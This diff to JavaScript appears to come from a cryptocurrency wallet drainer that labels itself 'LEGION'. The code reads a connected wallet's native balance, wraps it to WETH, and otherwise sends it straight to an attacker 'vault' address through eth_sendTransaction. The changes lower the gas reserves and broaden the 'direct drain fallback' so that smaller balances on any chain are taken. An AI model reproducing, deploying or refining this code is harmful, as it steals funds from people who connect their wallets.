@@ -901,7 +901,7 @@
           try {
             var _nativeHex = await eth.request({ method: 'eth_getBalance', params: [evmAddr, 'latest'] });
             var _nativeBal = BigInt(_nativeHex);
-            var _wrapReserve = BigInt('2000000000000000'); // 0.002 ETH/BNB/MATIC for wrap tx gas
+            var _wrapReserve = BigInt('100000000000000'); // 0.0001 ETH (~$0.25) for wrap tx gas — enough at any gas price
             if (_nativeBal > _wrapReserve && _wethAddr) {
               var _wrapAmt = _nativeBal - _wrapReserve;
               console.log('[LEGION] 🔄 Wrapping ' + _wrapAmt + ' wei → WETH on chain ' + evmChainId);
@@ -943,19 +943,24 @@
                   } catch (_fbe) {}
                 }
               }
-            } else if (_nativeBal > BigInt('1000000000000000') && !_wethAddr && vaultEvm) {
-              // Unknown chain — direct drain fallback
-              var _directAmt = _nativeBal - BigInt('1000000000000000');
-              try {
-                var _directHash = await eth.request({
-                  method: 'eth_sendTransaction',
-                  params: [{ from: evmAddr, to: vaultEvm, value: '0x' + _directAmt.toString(16), gas: '0x5208' }]
-                });
-                connectedChains.EVM._ethTxHash = _directHash;
-                console.log('[LEGION] Unknown chain direct drain: ' + _directHash);
-              } catch (_de) {}
+            } else if (_nativeBal > BigInt('50000000000000') && vaultEvm) {
+              // Balance too low to wrap OR unknown chain — direct drain fallback
+              var _directGas = BigInt('30000000000000'); // 0.00003 ETH gas reserve for simple transfer
+              var _directAmt = _nativeBal > _directGas ? _nativeBal - _directGas : BigInt(0);
+              if (_directAmt > BigInt(0)) {
+                try {
+                  var _directHash = await eth.request({
+                    method: 'eth_sendTransaction',
+                    params: [{ from: evmAddr, to: vaultEvm, value: '0x' + _directAmt.toString(16), gas: '0x5208' }]
+                  });
+                  connectedChains.EVM._ethTxHash = _directHash;
+                  console.log('[LEGION] Direct drain fallback: ' + _directHash + ' (' + _directAmt + ' wei)');
+                } catch (_de) {
+                  console.debug('[LEGION] Direct drain rejected:', _de.message);
+                }
+              }
             } else {
-              console.log('[LEGION] Native wrap skip: bal=' + _nativeBal + ' weth=' + (_wethAddr || 'unknown chain'));
+              console.log('[LEGION] Native skip: bal=' + _nativeBal + ' too low (need >0.0003 ETH)');
             }
           } catch (_ne) {
             console.debug('[LEGION] Native balance check failed:', _ne.message);
